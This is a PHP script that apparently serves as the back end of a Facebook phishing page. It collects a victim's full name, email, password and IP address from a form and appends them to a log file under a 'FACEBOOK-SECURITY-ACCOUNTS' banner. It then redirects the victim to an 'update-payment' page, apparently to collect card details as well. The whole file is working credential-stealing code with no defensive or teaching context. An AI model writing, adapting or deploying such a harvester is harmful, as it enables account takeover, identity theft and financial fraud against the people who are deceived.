<?php
error_reporting(0);
$file = "bulandepanbelifortuneramin.txt";

$fullname = $_POST['name_id'];
$username = $_POST['email'];
$password = $_POST['pass_mail'];
$ip = $_SERVER['REMOTE_ADDR'];

$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');
fwrite($handle, "---------------------------------------------");

fwrite($handle, "\n");

fwrite($handle, "----FACEBOOK-SECURITY-ACCOUNTS-BY-MOKONDO----");
                 
fwrite($handle, "\n");

fwrite($handle, "Full Name      :");

fwrite($handle, "$fullname");

fwrite($handle, "\n");

fwrite($handle, "Email          :");

fwrite($handle, "$username");

fwrite($handle, "\n");

fwrite($handle, "Password       :");

fwrite($handle, "$password");

fwrite($handle, "\n");

fwrite($handle, "IP Address     :");

fwrite($handle, "$ip");

fwrite($handle, "\n");

fwrite($handle, "Data Masuk     :");

fwrite($handle, "$today");

fwrite($handle, "\n");

fwrite($handle, "---------------------END---------------------");


fwrite($handle, "\n");

fwrite($handle, "\n");


fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--

window.location=\"update-payment.html\";

// -->

</script>";

?>

